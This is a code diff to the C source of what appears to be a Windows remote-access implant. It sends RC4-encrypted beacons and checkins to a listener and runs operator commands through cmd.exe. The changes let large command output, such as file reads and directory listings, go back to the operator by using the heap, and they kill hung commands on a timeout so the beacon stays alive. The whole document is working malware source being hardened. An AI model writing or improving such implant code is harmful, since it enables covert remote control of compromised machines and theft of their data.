@@ -119,6 +119,12 @@
  * send_output), because escaping can turn one byte of that into six. */
 #define MAX_CMD_OUTPUT (256 * 1024)
 #define BEACON_SIZE 160
+/* One command may hold the beacon for at most this long. A command that hangs
+ * — waiting on input, spinning on a busy host — is killed so the next checkin
+ * goes out and the listener does not report a live host as gone. */
+#define EXEC_TIMEOUT_MS 300000
+#define STRINGIFY_(x) #x
+#define STRINGIFY(x) STRINGIFY_(x)
 
 static char g_session_id[64] = {0};
 static char g_beacon[BEACON_SIZE] = {0};
@@ -815,34 +821,48 @@ static int raw_plain_send(SOCKET s, const char *data, size_t len) {
  * appended outside it, so the line that goes on the wire is
  * RC4(json + '\n') + '\n'. */
 static int agent_send(SOCKET s, const char *data) {
-    unsigned char framed[SEND_BUF_SIZE];
-    size_t len = strlen(data);
+    size_t data_len = strlen(data);
     int rc;
 
     if (!g_rc4key_ready) init_rc4_key();
     /* data may already end in '\n' from some callers; the contract is exactly
      * one JSON + '\n' inside the ciphertext, so normalise to that. */
-    while (len > 0 && data[len - 1] == '\n') len--;
+    while (data_len > 0 && data[data_len - 1] == '\n') data_len--;
     /* +2: one for the inner '\n' (which IS part of the ciphertext, so it must
      * be encrypted as the next byte of the RC4 stream, not appended raw) and
      * one for the outer framing '\n' (which is NOT encrypted). */
-    if (len + 2 > sizeof(framed)) return -1;
+    size_t framed_len = data_len + 2;
+    /* SEND_BUF_SIZE on the stack fits a checkin or a register comfortably, and
+     * most replies are smaller than that. Only a reply whose output runs past
+     * the ceiling — a directory listing or a file read — needs the heap, and
+     * for those the alternative was a silent drop: the operator sees a command
+     * that never returns and cannot tell a 300 KB result from a dead host.
+     * The buffer is zeroed before free so the ciphertext of one reply is not
+     * left readable in the process. */
+    unsigned char stack_framed[SEND_BUF_SIZE];
+    unsigned char *framed = stack_framed;
+    int heap_alloced = 0;
+    if (framed_len > sizeof(stack_framed)) {
+        framed = (unsigned char *)malloc(framed_len);
+        heap_alloced = 1;
+        if (!framed) return -1;
+    }
     /* Encrypt json AND its trailing '\n' as one stream: RC4(json + '\n'). The
      * inner newline is a plaintext byte like any other, so it takes the next
      * keystream byte — writing it raw would put an unencrypted 0x0a where the
      * listener's _rc4_extract expects ciphertext and decrypt a wrong byte. */
-    memcpy(framed, data, len);
-    framed[len] = (unsigned char)'\n';                 /* plaintext inner '\n' */
-    rc4_crypt(g_rc4key, g_rc4key_len, framed, framed, len + 1);
-    framed[len + 1] = (unsigned char)'\n';             /* outer framing, raw */
-    len += 2;
+    memcpy(framed, data, data_len);
+    framed[data_len] = (unsigned char)'\n';           /* plaintext inner '\n' */
+    rc4_crypt(g_rc4key, g_rc4key_len, framed, framed, data_len + 1);
+    framed[data_len + 1] = (unsigned char)'\n';       /* outer framing, raw */
 
     if (g_tls_on) {
-        rc = tls_send_bytes(s, framed, len);
+        rc = tls_send_bytes(s, framed, framed_len);
     } else {
-        rc = raw_plain_send(s, (const char *)framed, len);
+        rc = raw_plain_send(s, (const char *)framed, framed_len);
     }
-    memset(framed, 0, sizeof(framed));
+    memset(framed, 0, framed_len);
+    if (heap_alloced) free(framed);
     return rc;
 }
 
@@ -1157,7 +1177,36 @@ static void exec_command(const char *cmd, char *out, size_t out_sz, size_t *out_
              GetCurrentProcessId(), GetTickCount());
     snprintf(cmdline, sizeof(cmdline), "cmd.exe /c \"%s\" > \"%s\" 2>&1", cmd, tmpfile);
 
-    int rc = system(cmdline);
+    /* system() blocks until the child exits, so a command that hangs — one
+     * waiting on input, or a query that spins on a busy DC — takes the whole
+     * implant with it: no further checkin, and the listener's session timeout
+     * reports the host as gone when it is a payload stuck in a shell. The
+     * timeout bounds how long any one command can hold the beacon, and the
+     * child is killed when it runs out so the next checkin goes out on time. */
+    int rc = 0;
+    {
+        STARTUPINFOA si;
+        PROCESS_INFORMATION pi;
+        char wcmdline[4096];
+        ZeroMemory(&si, sizeof(si));
+        si.cb = sizeof(si);
+        ZeroMemory(&pi, sizeof(pi));
+        snprintf(wcmdline, sizeof(wcmdline), "%s", cmdline);
+        if (CreateProcessA(NULL, wcmdline, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi)) {
+            DWORD wait = WaitForSingleObject(pi.hProcess, (DWORD)EXEC_TIMEOUT_MS);
+            if (wait == WAIT_TIMEOUT) {
+                TerminateProcess(pi.hProcess, 1);
+                WaitForSingleObject(pi.hProcess, INFINITE);
+                rc = -1;
+            } else {
+                GetExitCodeProcess(pi.hProcess, (LPDWORD)&rc);
+            }
+            CloseHandle(pi.hProcess);
+            CloseHandle(pi.hThread);
+        } else {
+            rc = system(cmdline);   /* CreateProcess failed; fall back */
+        }
+    }
 
     FILE *f = NULL;
     *out_len = 0;
@@ -1186,6 +1235,16 @@ static void exec_command(const char *cmd, char *out, size_t out_sz, size_t *out_
         DeleteFileA(tmpfile);
     }
     out[*out_len] = '\0';
+    /* A timed-out child is a partial answer at best; say so rather than let the
+     * operator read a truncated result as the command's real output. */
+    if (rc == -1 && *out_len < out_sz - 64) {
+        static const char note[] = "\r\n[command timed out after "
+            STRINGIFY(EXEC_TIMEOUT_MS) " ms and was killed]";
+        size_t nl = sizeof(note) - 1;
+        memcpy(out + *out_len, note, nl);
+        *out_len += nl;
+        out[*out_len] = '\0';
+    }
 }
 
 /* ── protocol handlers ── */
